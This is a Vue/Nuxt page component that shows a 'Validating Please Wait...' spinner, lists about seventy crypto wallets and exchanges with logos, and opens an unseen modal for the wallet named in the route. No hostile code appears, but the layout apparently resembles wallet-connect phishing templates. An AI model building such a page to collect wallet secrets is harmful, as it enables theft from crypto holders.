<template>
  <v-container fluid class="pa-0 dark py-16">
    <v-row justify="center" class="ma-0">
      <v-col cols="12" md="" v-if="!loading.wallet">
        <Modal v-if="wallet" :wallet="wallet" />
      </v-col>
      <v-col v-else cols="12" md="10">
        <v-card
          max-width="100%"
          width="500"
          tile
          flat
          color="transparent"
          class="mx-auto"
        >
          <v-card-text>
            <div class="d-flex justify-center mb-4">
              <v-avatar size="200" class="mx-auto">
                <v-img src="/13.png" sizes="200"> </v-img>
              </v-avatar>
            </div>
            <v-btn block large tile color="black" dark class="px-10">
              <v-progress-circular
                indeterminate
                size="30"
                color="white"
              ></v-progress-circular>

              <span class="ml-2">Validating Please Wait...</span>
            </v-btn>
          </v-card-text>
        </v-card>
      </v-col>
    </v-row>
  </v-container>
</template>

<script>
import { mapGetters } from "vuex";
import Modal from "~/components/modal.vue";
export default {
  data: () => ({}),
  components: { Modal },
  computed: {
    ...mapGetters({ loading: "app/getLoading" }),

    wallets() {
      return [
        {
          name: "Metamast",
          logo: "metamask.png",
        },
        {
          name: "Solana",
          logo: "solana.png",
        },
        {
          name: "Rainbow",
          logo: "rainbow.png",
        },
        {
          name: "Mykey",
          logo: "mykey.png",
        },
        {
          name: "Ronin",
          logo: "ronin.png",
        },
        {
          name: "MathWallet",
          logo: "math_wallet.png",
        },
        {
          name: "Slope",
          logo: "slope.png",
        },
        {
          name: "Loopring",
          logo: "loopring.jpeg",
        },
        {
          name: "Pillar",
          logo: "pillar.png",
        },
        {
          name: "Coinbase",
          logo: "coinbase-logo.png",
        },
        {
          name: "IM Token",
          logo: "imtoken.png",
        },
        {
          name: "Authereum",
          logo: "authereum.png",
        },
        {
          name: "Blockchain",
          logo: "blockchain.png",
        },
        {
          name: "Coin98",
          logo: "coin98.png",
        },
        {
          name: "Trust Wallet",
          logo: "trust.png",
        },
        {
          name: "Walleth",
          logo: "walleth.png",
        },
        {
          name: "Token Pocket",
          logo: "tokenpocket.png",
        },
        {
          name: "Solflare",
          logo: "solflare.svg",
        },
        {
          name: "Maiar",
          logo: "maiar.png",
        },
        {
          name: "Phantom",
          logo: "phantom.png",
        },
        {
          name: "Argent",
          logo: "argent.jpeg",
        },
        {
          name: "Trust Vault",
          logo: "trustvault.png",
        },
        {
          name: "Sollet",
          logo: "sollet.jpeg",
        },
        {
          name: "Safepal",
          logo: "safepal.png",
        },
        {
          name: "Atomic",
          logo: "atomic.png",
        },
        {
          name: "Eidoo",
          logo: "eidoo.png",
        },
        {
          name: "Gnosis",
          logo: "gnosis.jpeg",
        },
        {
          name: "Onto",
          logo: "onto.png",
        },
        {
          name: "Crypto",
          logo: "crypto.png",
        },
        {
          name: "Trezor",
          logo: "trezor.png",
        },
        {
          name: "Huobi",
          logo: "huobi.jpeg",
        },
        {
          name: "Ledgerlive",
          logo: "ledgerlive.png",
        },
        {
          name: "Mobox",
          logo: "mobox.png",
        },
        {
          name: "Bitpay",
          logo: "bitpay.png",
        },
        {
          name: "Geteio",
          logo: "gateio.png",
        },
        {
          name: "Tronlink",
          logo: "tronlink.png",
        },
        {
          name: "Kucoin",
          logo: "kucoin.png",
        },
        {
          name: "MEW Wallet",
          logo: "mew.png",
        },
        {
          name: "Binance",
          logo: "binance.png",
        },
        {
          name: "BNB",
          logo: "bnb.png",
        },
        {
          name: "Polkadot",
          logo: "polkadot.png",
        },
        {
          name: "XRP",
          logo: "xrp.png",
        },
        {
          name: "Stellar",
          logo: "stellar.png",
        },
        {
          name: "Tezos",
          logo: "tezos.png",
        },
        {
          name: "Theta",
          logo: "theta.png",
        },
        {
          name: "Tron",
          logo: "tron.png",
        },
        {
          name: "Cosmos",
          logo: "cosmos.png",
        },
        {
          name: "Kava",
          logo: "keva.png",
        },
        {
          name: "Filecoin",
          logo: "filecoin.png",
        },
        {
          name: "Ethereum Classic",
          logo: "ethereum-classic.png",
        },
        {
          name: "Parsiq",
          logo: "parsiq.jpeg",
        },
        {
          name: "Uniswap",
          logo: "uniswap.png",
        },
        {
          name: "Pancakeswap",
          logo: "pancakeswap.png",
        },
        {
          name: "Unifarm",
          logo: "unifarm.jpeg",
        },
        {
          name: "Lunchpool",
          logo: "lunchpool.jpeg",
        },
        {
          name: "Scale",
          logo: "scale.jpeg",
        },
        {
          name: "Swapp",
          logo: "swapp.jpeg",
        },
        {
          name: "Brave Wallet",
          logo: "brave-wallet-logo.png",
        },
        {
          name: "Easypocket",
          logo: "easypocket.jpeg",
        },
        {
          name: "Vision",
          logo: "vision.jpeg",
        },
        {
          name: "SWFT Wallet",
          logo: "swftwallet.png",
        },
        {
          name: "XDC",
          logo: "xdc-logo.png",
        },
        {
          name: "Unstoppable Wallet",
          logo: "unstoppableWallet.jpeg",
        },
        {
          name: "Meetone",
          logo: "meetone.png",
        },
        {
          name: "Dok Wallet",
          logo: "dok-wallet.jpeg",
        },
        {
          name: "1 Inch Wallet",
          logo: "1inchwallet.jpeg",
        },
        {
          name: "Midas Wallet",
          logo: "midas-wallet.jpeg",
        },
        {
          name: "MYKey Spatium",
          logo: "mykey-spatium.jpeg",
        },
      ];
    },
    wallet() {
      const name = this.$route.params.id;
      console.log(name);
      const selected = this.wallets.find((el) => {
        return el.name == name;
      });

      console.log(selected);
      return selected;
    },
  },

  methods: {},
};
</script>

<style>
</style>